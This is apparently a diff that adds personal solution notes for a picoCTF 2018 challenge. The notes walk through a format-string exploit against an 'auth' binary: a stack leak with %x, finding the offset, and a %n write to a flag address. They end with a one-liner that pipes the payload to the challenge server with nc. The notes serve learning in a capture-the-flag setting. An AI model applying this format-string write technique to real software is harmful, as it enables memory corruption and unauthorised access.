@@ -1,0 +1,35 @@
+
+# command in gdb to "run" and also pass in input
+run <<< $(python -c "print 'yes' + 'A'*70")
+
+# used this to set the flag to 1 in gdb
+set {int}0x804a04c = 1
+
+#find address I can influence
+python -c 'print "AAAA,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x"' | ./auth
+AAAA,80489a6,f7f555c0,804875a,ffed0b00,0,f7faf000,ffed0bc4,0,ffed0bc4,0,41414141,2c78252c,252c7825,78252c78,2c78252c,252c7825
+
+#as we can see, the 11th entry showed our 'A's
+# %11$x means print the 11th value as hex
+# 11th thing "up the stack"
+python -c 'print "AAAA,%11$x"' | ./auth
+AAAA,41414141
+
+#Variable we care about...
+#can be found looking in GDB at get_flag function
+#0x804a04c
+
+#with printf, the %n means to Write to this location however many characters have been printed so far.
+#see links in picoCTF2018/echooo_COMPLETE/connect.sh
+
+#This command is WRONG, but..
+#What it is saying is:  Write 4 to the address pointed to by these 4 A's.  In other words
+#Write 4 to 0x41414141
+python -c 'print "AAAA,%11$n"' | ./auth
+
+#Instead we want to write the value to 0x804a04c
+python -c 'print "\x4c\xa0\x04\x08,%11$n"' | ./auth
+
+python -c 'print "\x4c\xa0\x04\x08,%11$n"' | nc 2018shell.picoctf.com 43438 | grep -oE "picoCTF{.*}"
+
+
